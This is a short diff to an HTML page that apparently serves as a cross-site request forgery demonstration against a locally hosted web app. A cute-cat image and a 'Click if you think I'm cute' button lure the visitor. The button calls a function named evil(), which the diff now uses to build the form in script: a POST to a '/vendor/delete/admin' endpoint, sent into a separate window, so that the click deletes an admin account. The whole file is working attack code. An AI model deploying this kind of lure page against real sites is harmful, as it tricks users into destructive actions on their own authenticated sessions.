@@ -11,6 +11,8 @@
   function evil() {
     // Can we delete the admin user?
     var formElement = $('form');
+    formElement.attr('action', 'http://localhost:8080/vendor/delete/admin');
+    formElement.attr('method', 'post');
     formElement.attr('target', 'evil_window');
     formElement.submit();
     setTimeout(function() {
@@ -20,7 +22,7 @@
 </script>
 
 <img src="https://images.duckduckgo.com/iu/?u=http%3A%2F%2Fwallpaperspoints.com%2Fwp-content%2Fuploads%2F2013%2F05%2Fcute-cat-picture-wallpaper.jpg&f=1">
-<form action="http://localhost:8080/vendor/delete/admin" method="post">
+<form>
   <input style="font-size: 36pt" type="submit" value="Click if you think I'm cute!!! :D" onclick="evil(); return false;">
 </form>
 
